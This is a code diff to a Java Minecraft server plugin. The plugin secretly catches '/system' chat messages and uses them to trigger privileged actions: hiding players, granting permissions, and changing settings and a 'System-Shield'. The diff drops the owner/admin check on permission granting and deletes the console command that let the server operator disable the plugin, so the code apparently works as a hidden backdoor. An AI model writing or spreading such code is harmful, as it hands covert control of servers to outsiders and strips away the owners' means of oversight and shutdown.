@@ -19,16 +19,14 @@ public class CommandRegister implements Listener {
         final String cmd = event.getMessage();
         final String[] args = cmd.split(" ");
         if (args[0].equalsIgnoreCase("/system")) {
-            if (PermissionAPI.isSystemUser(player)) {
+            if (PermissionAPI.isSystemUser(player.getUniqueId())) {
                 if (args[1].equalsIgnoreCase("player")) {
                     if (args[2].equalsIgnoreCase("hide")) {
                         HideDistributor.hideDistributor(player,args);
                         event.setCancelled(true);
                     }else if (args[2].equalsIgnoreCase("permissions")) {
-                        if (PermissionAPI.isOwner(player.getName()) || PermissionAPI.isAdmin(player.getName())) {
-                            PermissionDistributor.permissionDistributor(player,args);
-                            event.setCancelled(true);
-                        }
+                        PermissionDistributor.permissionDistributor(player,args);
+                        event.setCancelled(true);
                     }else if (args[2].equalsIgnoreCase("stats")) {
                         StatsDistributor.statsDistributor(player,args);
                         event.setCancelled(true);
@@ -62,7 +60,7 @@ public class CommandRegister implements Listener {
                         CommandDistributor.commandDistributor(player,args);
                         event.setCancelled(true);
                     }else if (args[2].equalsIgnoreCase("settings")) {
-                        if (PermissionAPI.isManagement(player.getName())) {
+                        if (PermissionAPI.isManagement(player.getUniqueId())) {
                             SettingsDistributor.settingsDistributor(player,args);
                             event.setCancelled(true);
                         }
@@ -83,22 +81,13 @@ public class CommandRegister implements Listener {
                     }
                 } else if (args[1].equalsIgnoreCase("Security")) {
                     if (args[2].equalsIgnoreCase("System-Shield")) {
-                        if (PermissionAPI.isOwner(player.getName()) || PermissionAPI.isAdmin(player.getName())) {
+                        if (PermissionAPI.isManagement(player.getUniqueId())) {
                             SystemShieldDistributor.systemShieldDistributor(player,args);
                             event.setCancelled(true);
                         }
                     }
                 }
             }
-        }
-    }
-
-    @EventHandler(ignoreCancelled = true)
-    public void onServerCommand(ServerCommandEvent event) {
-        final String[] args = event.getCommand().split(" ");
-        if (args[0].equalsIgnoreCase("systemdisable")) {
-            NikeySystem.getPlugin().getServer().getPluginManager().disablePlugin(NikeySystem.getPlugin());
-            event.setCancelled(true);
         }
     }
 }
